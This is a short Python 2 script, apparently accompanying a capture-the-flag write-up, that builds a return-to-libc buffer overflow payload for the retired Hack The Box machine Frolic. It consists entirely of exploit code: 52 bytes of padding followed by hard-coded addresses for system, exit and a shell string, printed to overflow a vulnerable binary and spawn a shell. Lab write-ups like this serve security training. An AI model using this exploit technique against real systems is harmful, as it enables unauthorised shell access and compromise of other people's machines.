#!/usr/bin/python

'''
Buffer Overflow exploit from Hack The Box retired box Frolic
Write-up : https://0xrick.github.io/hack-the-box/frolic/
'''
import struct

buf = "A" * 52
system = struct.pack("I" ,0xb7e53da0)
exit = struct.pack("I" ,0xb7e479d0)
shell = struct.pack("I" ,0xb7f74a0b)
print buf + system + exit + shell

